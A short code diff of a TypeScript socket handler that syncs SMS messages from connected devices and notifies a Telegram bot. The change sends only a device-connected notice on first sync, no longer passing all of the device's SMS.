@@ -68,12 +68,9 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
             if (telegramBot?.isActive()) {
                 const deviceData = store.getDevice(data.deviceId);
 
-                if (isFirstSync && data.sms.length > 0) {
-                    // First sync: Pass all SMS - bot will sort by timestamp and show last 5
-                    await telegramBot.notifyDeviceConnected(
-                        deviceData?.device || { id: data.deviceId, name: data.deviceId } as any,
-                        data.sms
-                    );
+                if (isFirstSync && deviceData) {
+                    // First sync: Notify device is connected
+                    await telegramBot.notifyDeviceConnected(deviceData.device);
                 } else if (!isFirstSync) {
                     // Subsequent syncs: Only notify for NEW incoming SMS
                     const allSms = store.getSMS(data.deviceId);
